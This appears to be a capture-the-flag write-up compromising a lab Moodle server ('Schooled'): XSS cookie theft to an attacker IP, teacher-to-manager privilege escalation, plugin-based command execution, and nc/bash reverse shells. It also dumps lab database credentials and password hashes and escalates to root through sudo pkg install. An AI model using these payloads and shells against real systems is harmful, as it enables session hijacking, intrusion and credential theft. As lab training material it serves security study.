### Enum after registered
* http://moodle.schooled.htb/moodle/package.json
* http://moodle.schooled.htb/moodle/theme/upgrade.txt

### moodle CVE 2020 Googled
* https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-1049535
* https://moodle.org/mod/forum/discuss.php?d=410839#p1657001

### moddle CVE 2021
* https://moodle.org/mod/forum/discuss.php?d=407393#p1644268
* https://github.com/HoangKien1020/CVE-2020-14321
* https://vimeo.com/441698193

MSA-20-0009: Course enrolments allowed privilege escalation from teacher role into manager role.

### XSS 1 CVE 2020 to get the web foothold as Teacher
```js
<script>document.location="http://10.10.14.178/?"+document.cookie</script>
```

Let's start a Python HTTP server `python3 -m http.server 80`, and submit that as the `MoodleNet profile`. Almost instantly I get a hit back form my own IP trying to fetch the script.

Less than a minute later, there’s another hit, from Schooled. With that, I’m logged in as Manuel Phillips.

Doggy thing here is that automation implemented with the course. So might have to enroll the Math to get the cookie done.

### XSS 2 CVE 2021 to lateral movement to gain as Manager which have access to the `Site administration` panel
Another vulnerability affecting Moodle 3.9 (CVE-2020-14321) allows escalation of privileges from the teacher role to the manager role. A PoC exploit for this vulnerability is available on GitHub. A video walkthrough is also available. First we need to grab the `ID` of the current user (Manuel Phillips). One way to do this is looking at the URL of the profile page linked from the top right menu (`/moodle/user/profile.php?id=24`).
Next, we click the `Site home` link on the left and then select the `Mathematics course`. We access the participant list.

According to the PoC exploit, we need to enroll a user with manager role into our course. The `/teachers.html` page on the main website (`schooled.htb`) lists Lianne Carter as a Manager, making it a potential target:

```bash 
❯ curl -s http://schooled.htb/teachers.html | grep -i 'manager' -C 1

<h3 class="title">Lianne Carter</h3>
<span class="post">Manager & English Lecturer</span>
```

`Participants` then click the `Enrol users` button and select Lianne Carter from the list

##### Modify and resent
```txt original 
http://moodle.schooled.htb/moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=IiA477Lhm0&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist[]=25&roletoassign=5&startdate=4&duration=
```

We modify it by setting the `userlist` parameter to our ID ( 24 ) and the `roletoassign` parameter to 1.

Looking at the user list again, Manuel Phillips is now shown as a Manager. Let's `Log in as` http://moodle.schooled.htb/moodle/user/view.php?id=25&course=5

We could see it's the `&course=5` causing the issue here.

### Third vuln, CVE-2020-14321
* https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions

In order to enable plugin install, we follow the PoC for the CVE. From `Site administration` we select `Users`, then `Define roles`, `Manager` and `Edit`.

Intercept and Modify `POST http://moodle.schooled.htb/moodle/admin/roles/define.php?action=edit&roleid=1`

We can now execute arbitrary system commands from the `block_rce.php` page

```bash
❯ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php\?cmd\=id
uid=80(www) gid=80(www) groups=80(www)
```

### Foothold
nc mkfifo with url encode
```
curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.5%2080%20%3E%2Ftmp%2Ff
```
weird since the mkfifo didn't work after the shell called back. It just blank there.

```
curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.5/443 0>&1'" http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php
```

### Enum
For people used to Linux, it’s worth noting that the web root isn’t `/var/www/html` as is typically seen there, but rather `/usr/local/www/apache24/data`.

```bash
[www@Schooled /home]$ find / -name python3 2>/dev/null
/usr/local/bin/python3
/usr/local/share/bash-completion/completions/python3
[www@Schooled /home]$ /usr/local/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
```

After some enumeration we spot that the `/usr/local/www/apache24/data/moodle/config.php` file contains database credentials:
```php 
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');
```

```bash
find / -name mysql 2>/dev/null

/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 moodle
```

```bash mysql
moodle@localhost [moodle]> show tables;
moodle@localhost [moodle]> desc mdl_user;
moodle@localhost [moodle]> select username,password from mdl_user;

select username,password from mdl_user;
+-------------------+--------------------------------------------------------------+
| username          | password                                                     |
+-------------------+--------------------------------------------------------------+
| guest             | $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 |
| admin             | $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW |
```

The admin username has an email address for jamie@staff.schooled.htb. I’ll use some command line foo to get them into hashcat format:
```bash mysql 
moodle@localhost [moodle]> select email from mdl_user where username='admin';
select email from mdl_user where username='admin';
+--------------------------+
| email                    |
+--------------------------+
| jamie@staff.schooled.htb |
+--------------------------+
```

rockyou the credentials `jamie:!QAZ2wsx`.

### Root
```bash
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
    ```

Offical PDF is pretty good here. Only one thing might worth to mention is that the wild character `*` need an `\` to escape.

* https://0xdf.gitlab.io/2021/09/11/htb-schooled.html#shell-as-root